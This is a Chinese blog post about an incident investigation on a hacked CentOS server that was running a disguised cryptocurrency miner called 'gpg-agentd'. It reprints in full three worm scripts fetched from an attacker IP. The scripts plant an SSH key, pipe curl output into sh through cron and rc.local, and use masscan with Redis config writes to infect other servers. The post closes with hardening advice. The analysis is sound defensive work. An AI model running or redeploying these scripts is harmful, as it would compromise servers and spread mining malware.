\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s?\_\_biz=Mzg5NDMzNjYxOA==&mid=2247488698&idx=1&sn=df60c23755c60dae845925c810738346&chksm=c0207fbff757f6a91eeda0670709d5a08e96e22811fd5be3a8f3cd8356dcf7b4702188a08623&mpshare=1&scene=1&srcid=1014YK2cYFHmWYIkZs33sE2D&sharer\_sharetime=1602635302107&sharer\_shareid=c051b65ce1b8b68c6869c6345bc45da1&key=10b5f81a683662238a12b0d88a98cb8fc6e2a517de71b350af3172f34bb347494c8d25dfd32116244f3a1b4944cb8c90faa77ac4ce1499ab772d2118e68c5e215526ab1540b950938e676f417de08f2979aaef4189161cd1d4db0f6d57f4e19cac2454c34edffacfa3d05f9ee7359feb4440e206c4a4a66d92476fabb6b11fd3&ascene=1&uin=ODk4MDE0MDEy&devicetype=Windows+10+x64&version=6300002f&lang=zh\_CN&exportkey=ARtcheIIJiEWCFcUt4Ozxnw%3D&pass\_ticket=5iBkjjQtfbEoCMU4%2BnfhOAJi%2FVJ%2BFty3yCm8kFn8GVUk3mWzBKMJBjfoyOfZ%2B5pr&wx\_header=0)

**0x00 背景**

周一早上刚到办公室，就听到同事说有一台服务器登陆不上了，我也没放在心上，继续边吃早点，边看币价是不是又跌了。不一会运维的同事也到了，气喘吁吁的说：我们有台服务器被阿里云冻结了，理由：对外恶意发包。我放下酸菜馅的包子，ssh 连了一下，被拒绝了，问了下默认的 22 端口被封了。让运维的同事把端口改了一下，立马连上去，顺便看了一下登录名: root，还有不足 8 位的小白密码，心里一凉：被黑了！

**0x01 查找线索**
=============

服务器系统 CentOS 6.X，部署了 nginx，tomcat，redis 等应用，上来先把数据库全备份到本地，然后 top 命令看了一下，有 2 个 99% 的同名进程还在运行，叫 gpg-agentd。

![](https://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8EhllkibxqVTHiakzUZFFYicic1T4JaGsErZT1ia6JNRmDShuQugBX3KIBB2s57JnIr2IaxIRc5S5Ladpw/640?wx_fmt=png)  

来源：Hefe 看雪学院

google 了一下 gpg，结果是：

> GPG 提供的 gpg-agent 提供了对 SSH 协议的支持，这个功能可以大大简化密钥的管理工作。

看起来像是一个很正经的程序嘛，但仔细再看看服务器上的进程后面还跟着一个字母 d，伪装的很好，让人想起来 windows 上各种看起来像 svchost.exe 的病毒。继续

> ps eho command -p 23374
> 
> netstat -pan | grep 23374

查看 pid:23374 进程启动路径和网络状况，也就是来到了图 1 的目录，到此已经找到了黑客留下的二进制可执行文件。接下来还有 2 个问题在等着我：

> 1，文件是怎么上传的？  
> 2，这个文件的目的是什么，或是黑客想干嘛？

history 看一下，记录果然都被清掉了，没留下任何痕迹。继续命令 more messages，

![](https://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8EhllkibxqVTHiakzUZFFYicic1kL6mABDupETTfCA8ibhl05SG7XiciaEEGCd2m7cqQeduC0mA64bX9457g/640?wx_fmt=png)

  
看到了在半夜 12 点左右，在服务器上装了很多软件，其中有几个软件引起了我的注意，下面详细讲。边找边猜，如果我们要做坏事，大概会在哪里做文章，自动启动？定时启动？对，计划任务。

> crontab -e

![](https://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8EhllkibxqVTHiakzUZFFYicic1V5lAbDSkkPGmdTK4ibh82IM8MxwbW4jmkBtumYMF43WeqdiaJrfUDxLg/640?wx_fmt=png)

  
果然，线索找到了。

**0x02 作案动机**
=============

上面的计划任务的意思就是每 15 分钟去服务器上下载一个脚本，并且执行这个脚本。我们把脚本下载下来看一下。

> curl -fsSL 159.89.190.243/ash.php > ash.sh

**脚本内容如下：**

> uname -a
> 
> id
> 
> hostname
> 
> setenforce 0 2>/dev/null
> 
> ulimit -n 50000
> 
> ulimit -u 50000
> 
> crontab -r 2>/dev/null
> 
> rm -rf /var/spool/cron/\* 2>/dev/null
> 
> mkdir -p /var/spool/cron/crontabs 2>/dev/null
> 
> mkdir -p /root/.ssh 2>/dev/null
> 
> echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfB19N9slQ6uMNY8dVZmTQAQhrdhlMsXVJeUD4AIH2tbg6Xk5PmwOpTeO5FhWRO11dh3inlvxxX5RRa/oKCWk0NNKmMza8YGLBiJsq/zsZYv6H6Haf51FCbTXf6lKt9g4LGoZkpNdhLIwPwDpB/B7nZqQYdTmbpEoCn6oHFYeimMEOqtQPo/szA9pX0RlOHgq7Duuu1ZjR68fTHpgc2qBSG37Sg2aTUR4CRzD4Li5fFXauvKplIim02pEY2zKCLtiYteHc0wph/xBj8wGKpHFP0xMbSNdZ/cmLMZ5S14XFSVSjCzIa0+xigBIrdgo2p5nBtrpYZ2/GN3+ThY+PNUqx redisX' > /root/.ssh/authorized\_keys
> 
> echo '\*/15 \* \* \* \* curl -fsSL 159.89.190.243/ash.php|sh' > /var/spool/cron/root
> 
> echo '\*/20 \* \* \* \* curl -fsSL 159.89.190.243/ash.php|sh' > /var/spool/cron/crontabs/root
> 
> yum install -y bash 2>/dev/null
> 
> apt install -y bash 2>/dev/null
> 
> apt-get install -y bash 2>/dev/null
> 
> bash -c 'curl -fsSL 159.89.190.243/bsh.php|bash' 2>/dev/null

**大致分析一下该脚本的主要用途：**

> 首先是关闭 SELinux，解除 shell 资源访问限制，然后在 / root/.ssh/authorized\_keys 文件中生成 ssh 公钥，这样每次黑客登录这台服务器就可以免密码登录了，执行脚本就会方便很多，关于 ssh keys 的文章可以参考这一篇文章 SSH 原理与运用。接下来安装 bash，最后是继续下载第二个脚本 bsh.php，并且执行。

**继续下载并分析 bsh.pbp，内容如下：**

> sleep $(seq 3 7 | sort -R | head -n1)
> 
> cd /tmp || cd /var/tmp
> 
> sleep 1
> 
> mkdir -p .ICE-unix/... && chmod -R 777 .ICE-unix && cd .ICE-unix/...
> 
> sleep 1
> 
> if \[-f .watch\]; then
> 
> rm -rf .watch
> 
> exit 0
> 
> fi
> 
> sleep 1
> 
> echo 1 > .watch
> 
> sleep 1
> 
> ps x | awk '!/awk/ && /redisscan|ebscan|redis-cli/ {print $1}' | xargs kill -9 2>/dev/null
> 
> ps x | awk '!/awk/ && /barad\_agent|masscan|\\.sr0|clay|udevs|\\.sshd|xig/ {print $1}' | xargs kill -9 2>/dev/null
> 
> sleep 1
> 
> if ! \[-x /usr/bin/gpg-agentd\]; then
> 
> curl -s -o /usr/bin/gpg-agentd 159.89.190.243/dump.db
> 
> echo '/usr/bin/gpg-agentd' > /etc/rc.local
> 
> echo 'curl -fsSL 159.89.190.243/ash.php|sh' >> /etc/rc.local
> 
> echo 'exit 0' >> /etc/rc.local
> 
> fi
> 
> sleep 1
> 
> chmod +x /usr/bin/gpg-agentd && /usr/bin/gpg-agentd || rm -rf /usr/bin/gpg-agentd
> 
> sleep 1
> 
> if ! \[-x "$(command -v masscan)" \]; then
> 
> rm -rf /var/lib/apt/lists/\*
> 
> rm -rf x1.tar.gz
> 
> if \[-x "$(command -v apt-get)" \]; then
> 
> export DEBIAN\_FRONTEND=noninteractive
> 
> apt-get update -y
> 
> apt-get install -y debconf-doc
> 
> apt-get install -y build-essential
> 
> apt-get install -y libpcap0.8-dev libpcap0.8
> 
> apt-get install -y libpcap\*
> 
> apt-get install -y make gcc git
> 
> apt-get install -y redis-server
> 
> apt-get install -y redis-tools
> 
> apt-get install -y redis
> 
> apt-get install -y iptables
> 
> apt-get install -y wget curl
> 
> fi
> 
> if \[-x "$(command -v yum)" \]; then
> 
> yum update -y
> 
> yum install -y epel-release
> 
> yum update -y
> 
> yum install -y git iptables make gcc redis libpcap libpcap-devel
> 
> yum install -y wget curl
> 
> fi
> 
> sleep 1
> 
> curl -sL -o x1.tar.gz https://github.com/robertdavidgraham/masscan/archive/1.0.4.tar.gz
> 
> sleep 1
> 
> \[-f x1.tar.gz\] && tar zxf x1.tar.gz && cd masscan-1.0.4 && make && make install && cd .. && rm -rf masscan-1.0.4
> 
> fi
> 
> sleep 3 && rm -rf .watch
> 
> bash -c 'curl -fsSL 159.89.190.243/rsh.php|bash' 2>/dev/null

**这段脚本的代码比较长，但主要的功能有 4 个：**

> 1，下载远程代码到本地，添加执行权限，chmod u+x。  
> 2，修改 rc.local，让本地代码开机自动执行。  
> 3，下载 github 上的开源扫描器代码，并安装相关的依赖软件，也就是我上面的 messages 里看到的记录。  
> 4，下载第三个脚本，并且执行。

**我去 github 上看了下这个开源代码，简直吊炸天。**

> MASSCAN: Mass IP port scanner  
> This is the fastest Internet port scanner. It can scan the entire Internet in under 6 minutes, > transmitting 10 million packets per second.
> 
> It produces results similar to nmap, the most famous port scanner. Internally, it operates more > like scanrand, unicornscan, and ZMap, using asynchronous transmission. The major difference is > that it's faster than these other scanners. In addition, it's more flexible, allowing arbitrary > address ranges and port ranges.
> 
> NOTE: masscan uses a custom TCP/IP stack. Anything other than simple port scans will cause  conflict with the local TCP/IP stack. This means you need to either use the -S option to use a separate IP address, or configure your operating system to firewall the ports that masscan uses.

transmitting 10 million packets per second(每秒发送 1000 万个数据包)，比 nmap 速度还要快，这就不难理解为什么阿里云把服务器冻结了，大概看了下 readme 之后，我也没有细究，继续下载第三个脚本。

> setenforce 0 2>/dev/null
> 
> ulimit -n 50000
> 
> ulimit -u 50000
> 
> sleep 1
> 
> iptables -I INPUT 1 -p tcp --dport 6379 -j DROP 2>/dev/null
> 
> iptables -I INPUT 1 -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT 2>/dev/null
> 
> sleep 1
> 
> rm -rf .dat .shard .ranges .lan 2>/dev/null
> 
> sleep 1
> 
> echo 'config set dbfilename"backup.db"' > .dat
> 
> echo 'save' >> .dat
> 
> echo 'flushall' >> .dat
> 
> echo 'set backup1"\\n\\n\\n\*/2 \* \* \* \* curl -fsSL http://159.89.190.243/ash.php | sh\\n\\n"' >> .dat
> 
> echo 'set backup2"\\n\\n\\n\*/3 \* \* \* \* wget -q -O- http://159.89.190.243/ash.php | sh\\n\\n"' >> .dat
> 
> echo 'set backup3"\\n\\n\\n\*/4 \* \* \* \* curl -fsSL http://159.89.190.243/ash.php | sh\\n\\n"' >> .dat
> 
> echo 'set backup4"\\n\\n\\n\*/5 \* \* \* \* wget -q -O- http://159.89.190.243/ash.php | sh\\n\\n"' >> .dat
> 
> echo 'config set dir"/var/spool/cron/"' >> .dat
> 
> echo 'config set dbfilename"root"' >> .dat
> 
> echo 'save' >> .dat
> 
> echo 'config set dir"/var/spool/cron/crontabs"' >> .dat
> 
> echo 'save' >> .dat
> 
> sleep 1
> 
> masscan --max-rate 10000 -p6379,6380 --shard $(seq 1 22000 | sort -R | head -n1)/22000 --exclude 255.255.255.255 0.0.0.0/0 2>/dev/null | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq > .shard
> 
> sleep 1
> 
> while read -r h p; do
> 
> cat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &
> 
> done < .shard
> 
> sleep 1
> 
> masscan --max-rate 10000 -p6379,6380 192.168.0.0/16 172.16.0.0/16 116.62.0.0/16 116.232.0.0/16 116.128.0.0/16 116.163.0.0/16 2>/dev/null | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq > .ranges
> 
> sleep 1
> 
> while read -r h p; do
> 
> cat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &
> 
> done < .ranges
> 
> sleep 1
> 
> ip a | grep -oE '(\[0-9\]{1,3}.?){4}/\[0-9\]{2}' 2>/dev/null | sed 's/\\/\\(\[0-9\]\\{2\\}\\)/\\/16/g' > .inet
> 
> sleep 1
> 
> masscan --max-rate 10000 -p6379,6380 -iL .inet | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq > .lan
> 
> sleep 1
> 
> while read -r h p; do
> 
> cat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &
> 
> done < .lan
> 
> sleep 60
> 
> rm -rf .dat .shard .ranges .lan 2>/dev/null

如果说前两个脚本只是在服务器上下载执行了二进制文件，那这个脚本才真正显示病毒的威力。下面就来分析这个脚本。

> 一开始的修改系统环境没什么好说的，接下来的写文件操作有点眼熟，如果用过 redis 的人，应该能猜到，这里是对 redis 进行配置。写这个配置，自然也就是利用了 redis 把缓存内容写入本地文件的漏洞，结果就是用本地的私钥去登陆被写入公钥的服务器了，无需密码就可以登陆，也就是我们文章最开始的 / root/.ssh/authorized\_keys。登录之后就开始定期执行计划任务，下载脚本。好了，配置文件准备好了，就开始利用 masscan 进行全网扫描 redis 服务器，寻找肉鸡，注意看这 6379 就是 redis 服务器的默认端口，如果你的 redis 的监听端口是公网 IP 或是 0.0.0.0，并且没有密码保护，不好意思，你就中招了。

**0x03 总结**
===========

通过依次分析这 3 个脚本，就能看出这个病毒的可怕之处，先是通过写入 ssh public key 拿到登录权限，然后下载执行远程二进制文件，最后再通过 redis 漏洞复制，迅速在全网传播，以指数级速度增长。那么问题是，这台服务器是怎么中招的呢？看了下 redis.conf，bind 的地址是 127.0.0.1，没啥问题。由此可以推断，应该是 root 帐号被暴力破解了，为了验证我的想法，我 lastb 看了一下，果然有大量的记录：

![](https://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8EhllkibxqVTHiakzUZFFYicic1BnVa0F2eYbrOqOAauJg0zOQzFryh1gxEjC5OQicWzMeGTKfBaXiciaTVA/640?wx_fmt=png)  

还剩最后一个问题，这个 gpg-agentd 程序到底是干什么的呢？我当时的第一个反应就是矿机，因为现在数字货币太火了，加大了分布式矿机的需求，也就催生了这条灰色产业链。于是，顺手把这个 gpg-agentd 拖到 ida 中，用 string 搜索 bitcoin, eth, mine 等相关单词，最终发现了这个：

![](https://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8EhllkibxqVTHiakzUZFFYicic1LyA74MekuEOE0aicMFhVVSficr0jHamrJ1cyMS6QXibnQPYUnr4cZNCfA/640?wx_fmt=png)

打开 nicehash.com 看一下，一切都清晰了。

![](https://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8EhllkibxqVTHiakzUZFFYicic1UW5JxuAIvmO3pUnpOKgia3SoaiaLxURafwb7ILLBriaGpPH5a5CsCxkiag/640?wx_fmt=jpeg)

**0x04 安全建议**
=============

### **一、服务器**

> 1，禁用 ROOT  
> 2，用户名和密码尽量复杂  
> 3，修改 ssh 的默认 22 端口  
> 4，安装 DenyHosts 防暴力破解软件  
> 5，禁用密码登录，使用 RSA 公钥登录

### **二、redis**

> 1，禁用公网 IP 监听，包括 0.0.0.0  
> 2，使用密码限制访问 redis  
> 3，使用较低权限帐号运行 redis

到此，整个入侵过程基本分析完了，如果大家对样本有兴趣，也可以自行去 **curl**，或是去虚拟机执行上面的脚本。鉴于本人能力有限，文中难免会出现疏忽或是错误，还请大家多多指正。

![](https://mmbiz.qpic.cn/mmbiz_png/83e7tQTo0wO7OjZo110ia3ial18mgQbCwFzxQicmSFicxeBRicakYQAHJ4QsBtT4j6RuZkWyKS1o6U2ufeg6k7ia6quQ/640?wx_fmt=png)****![](https://mmbiz.qpic.cn/mmbiz_png/83e7tQTo0wPqZBQGoIee5SUPvSghllp2hRZ6cX9rViaT6ibibciaiamMicNoVsmAqgwhbQ2vvvq7eSGxTlX0g6qEFVaw/640?wx_fmt=png)****

↑↑↑**长按**图片**识别二维码**关註↑↑↑